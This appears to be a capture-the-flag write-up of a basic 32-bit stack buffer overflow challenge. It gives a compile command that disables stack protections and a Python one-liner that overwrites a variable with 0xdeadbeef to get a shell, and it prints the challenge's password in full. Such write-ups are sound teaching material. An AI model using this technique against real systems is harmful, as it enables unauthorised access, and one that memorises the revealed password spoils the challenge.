# ELF x86 - Stack Buffer Overflow Basic 1
![base](https://github.com/user-attachments/assets/bf728ba8-00c5-447c-bcc0-def3ef1b8624)

## Source Analysie

We analyze the code

<img width="1366" height="768" alt="1 3" src="https://github.com/user-attachments/assets/624eea13-4273-4c5a-b238-e75513fd0df0" />

* **Buffer:** `char buf[40]` — The allocated space in the stack.
* **Vulnerability:** `fgets(buf, 45, stdin)` — It reads 45 bytes into a 40-byte buffer.
* **Win Condition:** The local variable `check` must be overwritten with `0xdeadbeef`.

## Compilation and strategy

We compile the code with protection disabled to simulate a vulnerability.

```bash
gcc elf.c -o elf -m32 -fno-stack-protector -z execstack -no-pie -Wno-stringop-overflow
```
![1 4](https://github.com/user-attachments/assets/349842db-4367-458a-a9f5-fcaee2497c11)

- -m32: Compiles for 32-bit architecture.
- -fno-stack-protector: Disables stack canaries.
- -z execstack: Enables executable stack.
- -no-pie: Disables Position Independent Executable (static addresses).
- -Wno-stringop-overflow: To prevent complaints from the program

I use a one-liner in Python combined with the `cat` command to maintain an interactive shell after submitting

```bash
(python3 -c "from pwn import *; sys.stdout.buffer.write(b'A' * 40 + p32(0xdeadbeef)"; cat) | ./elf
```

![1 5](https://github.com/user-attachments/assets/de9e1231-9035-4cd0-b374-99908be30ea8)

## Exploitation

After connecting via SSH, we enter the same command and it doesn’t work.

![1 6](https://github.com/user-attachments/assets/260ec6b4-ad07-4043-af45-94d0ff449a13)

The pwn library is not available on the remote server, so we use the system library instead and slightly adjust the (p32(0xdeadbeef) >> b'\xef\xbe\xad\xde') line, since the pwn library is no longer used.

![1 7](https://github.com/user-attachments/assets/90093cb9-3b16-4690-89c0-80be5977290b)

Gaining access to the shell

We check the rights and read the file, we get the password

**Password: 1w4ntm0r3pr0np1s** 

![1 8](https://github.com/user-attachments/assets/fcb74346-8231-4fcd-822f-0b7c2c409259)

